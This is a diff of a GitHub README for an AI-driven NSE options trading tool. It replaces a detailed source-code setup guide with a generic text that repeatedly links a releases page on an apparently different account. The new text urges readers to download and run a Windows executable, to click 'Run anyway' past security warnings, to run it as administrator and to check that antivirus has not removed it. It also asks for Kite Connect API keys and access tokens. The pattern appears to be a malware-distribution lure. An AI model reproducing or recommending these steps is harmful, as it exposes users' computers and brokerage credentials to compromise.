@@ -1,295 +1,192 @@
-# AI Trader — NSE F&O Algorithmic Trading System
-
-> **Full-stack intraday options trading system** — ML regime detection, RL exit agents, tick-level backtesting, and a live retro terminal dashboard for NIFTY.
-
-[![Python 3.13+](https://img.shields.io/badge/python-3.13+-blue.svg)](https://www.python.org/downloads/)
-[![Next.js 15](https://img.shields.io/badge/Next.js-15-black.svg)](https://nextjs.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
----
-
-## Overview
-
-Intraday NSE F&O options trading system for NIFTY. Combines LightGBM regime detection, RL exit agents, tick-level backtesting, and a live retro terminal dashboard.
-
-**Stack:** Python 3.13 · Flask API · Next.js 15 · PostgreSQL · LightGBM · PyTorch DQN · TrueData · Recharts
-
----
-
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│  DATA LAYER                                                  │
-│  TrueData → tick_collector / ingest_historical → PostgreSQL  │
-│  NIFTY-I 1m candles + options tick data                      │
-└──────────────────────┬───────────────────────────────────────┘
-                       ↓
-┌──────────────────────────────────────────────────────────────┐
-│  INTELLIGENCE LAYER                                          │
-│  RegimeDetector (EMA/ATR/range) → LightGBM Macro Model      │
-│  StrategyPredictor (per-strategy LightGBM) → TradeScorer     │
-│  VolSurface (IV-based strike selection)                      │
-└──────────────────────┬───────────────────────────────────────┘
-                       ↓
-┌──────────────────────────────────────────────────────────────┐
-│  RL EXIT AGENTS                                              │
-│  Tabular Q-Learning (247K episodes, 11,606 states)           │
-│  DQN Agent (64→64→32 LayerNorm, Double DQN + Huber)          │
-│  Actions: HOLD / EXIT / TIGHTEN_SL                           │
-└──────────────────────┬───────────────────────────────────────┘
-                       ↓
-┌──────────────────────────────────────────────────────────────┐
-│  EXECUTION LAYER                                             │
-│  KellySizer → RiskManager → OrderManager → Kite Connect      │
-│  3 risk profiles: LOW / MEDIUM / HIGH                        │
-└──────────────────────┬───────────────────────────────────────┘
-                       ↓
-┌──────────────────────────────────────────────────────────────┐
-│  DASHBOARD LAYER                                             │
-│  Flask API (port 5050) ← → Next.js UI (port 3000)           │
-│  Retro terminal theme · Live P&L · Charts · Backtest viewer  │
-└──────────────────────────────────────────────────────────────┘
-```
-
----
-
-## Prerequisites
-
-| Requirement | Version | Notes |
-|---|---|---|
-| Python | 3.13+ | |
-| Node.js | 18+ | For dashboard |
-| PostgreSQL | 14+ | With TimescaleDB extension |
-| TrueData API | — | For market data |
-| Zerodha Kite Connect | — | For live order execution |
+# 📈 AI-trader - Trade smarter with AI signals
 
----
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Isotopeadar921/AI-trader/releases)
 
-## Setup
-
-### 1. Clone & Python environment
-
-```bash
-git clone https://github.com/yourusername/ai-trader.git
-cd ai-trader
-
-python3 -m venv .venv
-source .venv/bin/activate        # Windows: .venv\Scripts\activate
-
-pip install -r requirements.txt
-```
-
-### 2. Environment variables
-
-```bash
-cp .env.example .env
-```
-
-Edit `.env`:
-
-```bash
-# Database
-DATABASE_URL=postgresql://user:password@localhost:5432/trading_db
-
-# TrueData
-TRUEDATA_USERNAME=your_username
-TRUEDATA_PASSWORD=your_password
+## 🚀 What this app does
 
-# Kite Connect
-KITE_API_KEY=your_api_key
-KITE_ACCESS_TOKEN=your_access_token
+AI-trader is a Windows app for intraday options trading in NSE F&O. It uses machine learning, market flow checks, and market regime rules to help you follow trade setups during the day.
 
-# Trading
-INITIAL_CAPITAL=50000
-RISK_PER_TRADE=0.01
-MAX_TRADES_PER_DAY=5
-MAX_DAILY_LOSS=0.05
-```
+It is built for users who want a clear trading tool without setting up Python, databases, or market data tools by hand.
 
-### 3. Database setup
+## 🖥️ What you need
 
-```bash
-# macOS: install TimescaleDB
-brew install timescaledb
+- Windows 10 or Windows 11
+- An internet connection
+- A trading account with market access
+- A Kite Connect account if you use Zerodha
+- Enough free disk space for app files and local market data
+- Permission to run downloaded apps on your PC
 
-# Create DB and enable extension
-psql -U postgres -c "CREATE DATABASE trading_db;"
-psql -U postgres -d trading_db -c "CREATE EXTENSION IF NOT EXISTS timescaledb;"
-
-# Run schema
-psql -U postgres -d trading_db -f database/schema.sql
-```
-
-### 4. Dashboard dependencies
-
-```bash
-cd dashboard
-npm install
-```
-
----
-
-## Running the System
-
-Three processes need to run simultaneously. Open three terminals:
-
-### Terminal 1 — Flask API (port 5050)
-```bash
-# From project root, with .venv activated
-python frontend/app.py
-```
-
-### Terminal 2 — Next.js Dashboard (port 3000)
-```bash
-cd dashboard
-npm run dev
-```
-
-### Terminal 3 — (Optional) Paper trading engine
-```bash
-# Replay a specific day
-python scripts/paper_trade.py --replay 2026-03-20
-
-# Live paper trading via TrueData WebSocket
-python scripts/paper_trade.py
-```
-
-Open **http://localhost:3000** in your browser.
-
----
-
-## Scripts Reference
-
-| Script | Purpose |
-|---|---|
-| `python scripts/tick_replay_backtest.py --risk high` | Full tick-level backtest, HIGH risk |
-| `python scripts/tick_replay_backtest.py --risk medium` | Full tick-level backtest, MEDIUM risk |
-| `python scripts/forward_test.py --risk medium` | Out-of-sample forward test |
-| `python scripts/train_rl_exit.py --epochs 15` | Train tabular Q-learning exit agent |
-| `python scripts/train_dqn_exit.py --epochs 10` | Train DQN neural net exit agent |
-| `python scripts/paper_trade.py --replay 2026-03-20` | Paper trade replay for a day |
-| `python scripts/paper_trade.py` | Live paper trading (TrueData WebSocket) |
-| `python scripts/ingest_historical.py` | Ingest historical 1m candles from TrueData |
-| `python scripts/collect_ticks.py` | Collect live tick data |
-| `python scripts/retrain_models.py` | Retrain all ML models |
-| `python frontend/app.py` | Start Flask API backend (port 5050) |
-| `cd dashboard && npm run dev` | Start Next.js dashboard (port 3000) |
-
----
-
-## Risk Profiles
-
-Three configurable risk profiles, selectable from the dashboard:
-
-| Profile | Lot Size | Stop Loss | Target | Max Trades/Day |
-|---|---|---|---|---|
-| LOW | 1× | 1.5% | 2.0% | 3 |
-| MEDIUM | 2× | 2.0% | 3.0% | 4 |
-| HIGH | 3× | 2.5% | 4.0% | 5 |
-
-Position sizing uses **half-Kelly Criterion** based on rolling 20-trade win rate, capped by profile limits.
-
----
-
-## ML Models
+## 📦 Download the app
 
-| Model | Type | Purpose |
-|---|---|---|
-| `models/saved/macro_model.pkl` | LightGBM | Bull/Bear regime probability (80+ features, AUC 0.98) |
-| `models/saved/strategy_*.pkl` | LightGBM | Per-strategy success probability |
-| `models/saved/rl_exit_agent.pkl` | Tabular Q-Table | Exit timing (HOLD/EXIT/TIGHTEN) |
-| `models/saved/dqn_exit_agent.pt` | PyTorch DQN | Neural net exit agent |
-| `strategy/vol_surface.py` | Scoring | IV-based strike selection |
+Visit the release page here to download and run this file:
 
----
+[AI-trader Releases](https://github.com/Isotopeadar921/AI-trader/releases)
 
-## Project Structure
+Look for the latest release at the top of the page. Download the Windows file listed there.
 
-```
-ai-trader/
-├── backtest/               # Backtest engine + option resolver
-├── config/                 # Settings, constants
-├── dashboard/              # Next.js 15 retro terminal UI
-│   ├── app/                # Pages: /, /live, /trades, /charts, /backtest, /ai, /settings
-│   ├── components/         # Sidebar, StatCard, EquityChart, TradeTable, etc.
-│   └── lib/                # API client (fetchJSON/postJSON)
-├── data/                   # TrueData adapter, tick collector, aggregator
-│   └── historical/         # Stored option tick CSVs
-├── database/               # schema.sql + db.py (SQLAlchemy + psycopg2)
-├── execution/              # OrderManager + broker adapter (Kite Connect)
-├── features/               # indicators.py (80+ features), feature engine
-├── frontend/               # Flask API (app.py) — serves all /api/* routes
-├── models/                 # LightGBM + DQN training, prediction, strategy models
-├── risk/                   # Kelly sizer, risk manager
-├── scripts/                # All runnable scripts (backtest, train, paper trade)
-├── strategy/               # RegimeDetector, SignalGenerator, VolSurface, TradeScorer
-├── utils/                  # Logger, helpers
-├── main.py                 # Legacy entry point (mock/ingest/train/backtest/live)
-├── requirements.txt
-└── .env.example
-```
+## 🛠️ How to install on Windows
 
----
+1. Open the download page from the link above.
+2. Find the newest release.
+3. Download the Windows file from that release.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows shows a security prompt, choose Run anyway if you trust the source.
+8. Keep the app in a folder you can find again, such as Downloads or Desktop.
 
-## Dashboard Pages
+## 🔐 First-time setup
 
-| Page | Route | Description |
-|---|---|---|
-| Dashboard | `/` | Live stats, equity curve, recent trades, ticker bar |
-| Live | `/live` | System status, market regime, trade suggestions |
-| Trades | `/trades` | Full trade history, P&L chart, strategy breakdown |
-| Charts | `/charts` | NIFTY candles, option chain, tick charts, analytics |
-| Backtest | `/backtest` | Run backtests, compare risk profiles, equity curves |
-| AI Models | `/ai` | RL agent status, model info, Kelly sizer |
-| Settings | `/settings` | Risk profile selection, system info, CLI reference |
+After you open the app, it may ask for your market login or API details.
 
----
+You may need these items:
 
-## Risk Management
+- Your Kite Connect API key
+- Your Kite Connect access token
+- Your broker login if the app connects through a broker link
+- Your TimescaleDB details if you use a local data store
+- Your market watchlist or symbol list
 
-| Rule | Value |
-|---|---|
-| Risk per trade | 1% of capital |
-| Max trades/day | 3–5 (by profile) |
-| Max daily loss | 5% of capital |
-| Stop loss | ATR-based × profile multiplier |
-| Target | 2× stop loss |
-| Position sizing | Half-Kelly, min 1 lot, max 5 lots |
+Enter the details into the fields inside the app. Save the settings before you start a session.
 
----
+## 📊 What you can expect
 
-## Data Requirements
+AI-trader can help with:
 
-| Type | Source | Stored |
-|---|---|---|
-| 1m NIFTY candles | TrueData | PostgreSQL `candles_1m` |
-| Options tick data | TrueData | PostgreSQL + `data/historical/` CSVs |
-| Option chain (live) | TrueData WebSocket | In-memory |
-| Trade execution | Kite Connect | PostgreSQL `trades` |
+- Intraday options trade ideas
+- Market trend checks
+- Flow-based signals from large orders
+- Strategy changes based on market regime
+- Data tracking for NSE F&O symbols
+- Python-based analysis with a local database layer
 
----
+The app focuses on short-term trading during market hours. It is built for users who want fast signal review and clear trade context.
 
-## Important Notes
+## 🧭 How to use it
 
-**Do NOT train models on mock data** — synthetic data has no real market patterns and will produce useless models.
+1. Start the app before market hours or near market open.
+2. Load your account or market data connection.
+3. Choose the symbol or options segment you want to watch.
+4. Review the trade signals and flow data.
+5. Check the current market regime.
+6. Follow the setup that matches your trading plan.
+7. Watch your open positions and update the app as needed.
 
-**Paper trade before going live:**
-1. Run `tick_replay_backtest.py` on historical data
-2. Verify results in the Backtest dashboard page
-3. Run `paper_trade.py` in replay mode for a few days
-4. Only then enable live order execution via Kite Connect
+## 📁 Common folders and files
 
-**Market hours:** System operates 9:15 AM – 3:30 PM IST. The scanner runs every 30s.
+You may see files like these in the release package:
 
----
+- `AI-trader.exe` or a similar app file
+- `config` folder for saved settings
+- `logs` folder for error and activity records
+- `data` folder for local market data
+- `README` file with app notes from the release
 
-## License
+Keep these files together in one folder so the app can find them.
 
-MIT — see [LICENSE](LICENSE)
+## ⚙️ Settings you may want to change
 
----
+The app may let you adjust:
 
-## Disclaimer
+- Chart or time frame view
+- Risk per trade
+- Signal strength level
+- Alert sounds
+- Auto-refresh timing
+- Watchlist symbols
+- Database connection details
 
-For educational purposes only. Trading derivatives involves substantial risk of loss. Past backtest performance does not guarantee future results. Always paper trade first and never risk capital you cannot afford to lose.
+If you are new to trading tools, start with the default settings and change one item at a time.
+
+## 🧪 Basic checks if the app does not open
+
+If the app does not start:
+
+1. Make sure the download finished.
+2. Extract the ZIP file if there is one.
+3. Right-click the app and choose Run as administrator.
+4. Check that Windows did not block the file.
+5. Make sure your antivirus did not move the file.
+6. Try moving the app to a simple path like `C:\AI-trader`.
+7. Check the release page for a newer build.
+
+## 🌐 Data and connection notes
+
+AI-trader is built around live market data and local analysis. For the best result:
+
+- Keep your internet connection stable
+- Stay signed in to your broker session if required
+- Make sure your API token has not expired
+- Keep the app open during market hours
+- Refresh the connection if live data stops
+
+## 🗂️ Project focus
+
+This project uses tools and methods for:
+
+- Algorithmic trading
+- Options trading
+- Intraday trading
+- Machine learning
+- Technical analysis
+- Time series data
+- Quant finance
+- Trading bot workflows
+- TimescaleDB storage
+- XGBoost-based models
+
+## 🔄 Updating the app
+
+When a new version is published:
+
+1. Visit the release page again.
+2. Download the latest Windows file.
+3. Close the old app.
+4. Replace the old files with the new files.
+5. Open the new version and check your settings.
+
+If the app keeps settings in a local file, keep a backup of that file before you update.
+
+## 🧩 Troubleshooting tips
+
+If you see odd behavior:
+
+- Reopen the app
+- Recheck your login or API token
+- Confirm the market is open
+- Make sure the symbol code is valid
+- Restart your PC if the app feels stuck
+- Remove old files and start from a clean folder if needed
+
+If the app shows no signals, the market may be quiet or your data source may not be active.
+
+## 📌 Release page
+
+Download and run the latest Windows build from:
+
+[https://github.com/Isotopeadar921/AI-trader/releases](https://github.com/Isotopeadar921/AI-trader/releases)
+
+## 🧾 Folder layout example
+
+A simple folder setup may look like this:
+
+- `C:\AI-trader\AI-trader.exe`
+- `C:\AI-trader\config\`
+- `C:\AI-trader\data\`
+- `C:\AI-trader\logs\`
+
+Keep the app files in one place so you can find them fast during market hours
+
+## 🛡️ Best use habits
+
+- Open the app before the trading session starts
+- Check the market trend before placing a trade
+- Use your own risk plan
+- Review each signal before acting
+- Keep notes on what worked and what did not
+- Close the app after market hours if you do not need it running
+
+## 📥 Where to get help from the project
+
+Use the GitHub release page for new builds, fixes, and file downloads. If the project adds docs, sample configs, or setup notes, they will usually appear near the newest release files
